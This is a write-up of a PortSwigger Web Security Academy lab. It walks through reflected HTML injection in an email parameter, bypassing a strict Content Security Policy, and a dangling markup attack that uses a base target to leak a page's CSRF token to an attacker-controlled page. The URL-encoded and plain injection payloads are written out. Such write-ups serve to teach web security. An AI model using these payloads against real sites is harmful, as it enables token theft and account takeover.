### Lab: Reflected XSS protected by very strict CSP, with dangling markup attack
After we've logged in, we hit the endpoint:
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener
```
On the page that we get back, we have the following:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc">
    <button class="button" type="submit"> Update email </button>
</form>
```
It turns out if we add `&email=22` to the url, we see that it is reflected in the value of the email input:
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener&email=22
```
```bash
<input required="" type="email" name="email" value="22">
```
With that knowledge we can try to break out of that email input element, and we try to inject e.g. an `<img>` element. 
We use the following payload: `"><img src="https://www.google.com/someimage"` but we have to **url encode** it.
```
https://0a2d006004c50adc80a335c400d10074.web-security-academy.net/my-account?id=wiener&email=%22%3e%3c%69%6d%67%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%73%6f%6d%65%69%6d%61%67%65%22
```
It worked. A new img element appeared on the page.
We also got the following err: `Refused to load the image 'https://www.google.com/someimage' because it violates the following Content Security Policy directive: "img-src 'self'"`

Because of csp we can't really load external images. But we can anyway expect user to click on some button that we inject. So we try the following (we have to url encode, but here we're not doing it for the sake of readability):
```bash
...&email="><a href="http://localhost:3000">Click me</a><base target=haha>
```
`<base target=haha>` here plays an interesting role. When user clicks on "Click me" they are redirected to `http://localhost:3000`. (of course we can use malicious website instead of localhost) 
On malicious website (on localhost in our case) inside of dev tools when we write `window.name` we see `haha` returned. `haha` was specified as `target` in `<base target="haha">`

Now let's try dangling markup vulnerability:
It's important to remember what the page html elements are:
```bash
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc">
    <button class="button" type="submit"> Update email </button>
</form>
```

So in the url we specify the following (of course url encoded version of it):
```bash
...&email="><a href="http://localhost:3000">Click me</a><base target="
```
And when we navigate to malicious website (`localhost` in this case) we see the following:
```bash
'">\n <input required type="hidden" name="csrf" value="v7Xx9rRq52EkoS8VjyKPWcFALllqY5zc"><button class='
```
> Note: the technique above no longer works on port swigger academy, the lab has been updated. But the technique above is still interesting, that's why it is included here.

